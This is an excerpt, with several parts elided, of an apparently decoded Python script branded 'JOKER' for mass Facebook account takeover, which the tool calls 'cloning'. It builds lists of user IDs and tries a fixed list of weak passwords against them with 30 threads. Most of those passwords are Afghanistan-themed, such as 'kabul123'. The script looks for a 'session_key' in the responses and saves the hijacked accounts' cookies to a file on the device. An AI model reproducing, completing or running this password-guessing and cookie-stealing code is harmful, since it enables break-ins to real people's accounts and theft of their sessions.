#DECODE/BY/SaManDar
#JOKER
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.www')
...
os.system('xdg-open https://www.facebook.com/profile.php?id=JOKER')
...
def FKING():
			clear()
		#	linex()
			print('[1] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐈𝐍𝐆[2] 𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐈𝐍𝐆[3] 𝐅𝐎𝐋𝐋𝐎𝐖 𝐎𝐍 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊[0] 𝐄𝐗𝐈𝐓 𝐉𝐎𝐊𝐄𝐑')
			linex()
...
def AFG():
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan123','50005000','۱۲۳۴۵۶۷۸','۱۲۳۴۵۶۷۸۹afghanistan12','afghanistan1234','afghanistan12345']
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [JOKER]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/JOKER-COOKIE.txt','a').write(coki+'\n')
